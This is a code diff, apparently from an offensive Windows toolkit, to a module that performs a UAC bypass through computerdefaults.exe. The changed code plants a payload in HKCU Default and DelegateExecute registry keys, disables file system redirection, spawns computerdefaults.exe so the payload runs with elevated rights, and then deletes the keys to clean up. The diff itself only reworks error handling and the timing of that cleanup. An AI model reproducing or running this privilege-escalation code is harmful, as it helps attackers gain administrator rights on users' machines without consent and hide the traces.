@@ -19,6 +19,7 @@ def computerdefaults_cleanup(path):
 	print_info("Performing cleaning")
 	if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
 		print_success("Successfully cleaned up")
+		print_success("All done!")
 	else:
 		print_error("Unable to cleanup")
 		return False
@@ -32,8 +33,10 @@ def computerdefaults(payload):
 				print_success("Successfully created Default and DelegateExecute key containing payload ({payload})".format(payload=os.path.join(payload)))
 			else:
 				print_error("Unable to create registry keys")
-				if "error" in Constant.output:
-					computerdefaults_cleanup(path)
+				for x in Constant.output:
+					if "error" in x:
+						computerdefaults_cleanup(path)
+						return False
 		else:
 			print_error("Unable to create registry keys")
 			return False
@@ -45,15 +48,14 @@ def computerdefaults(payload):
 			print_success("Successfully disabled file system redirection")
 			if process().create("computerdefaults.exe"):
 				print_success("Successfully spawned process ({})".format(os.path.join(payload)))
+				time.sleep(5)
+				computerdefaults_cleanup(path)
 			else:
 				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
-				if "error" in Constant.output:
-					computerdefaults_cleanup(path)
-
-		time.sleep(5)
-
-		if not computerdefaults_cleanup(path):
-			print_success("All done!")
+				for x in Constant.output:
+					if "error" in x:
+						computerdefaults_cleanup(path)
+						return False
 	else:
 		print_error("Cannot proceed, invalid payload")
 		return False
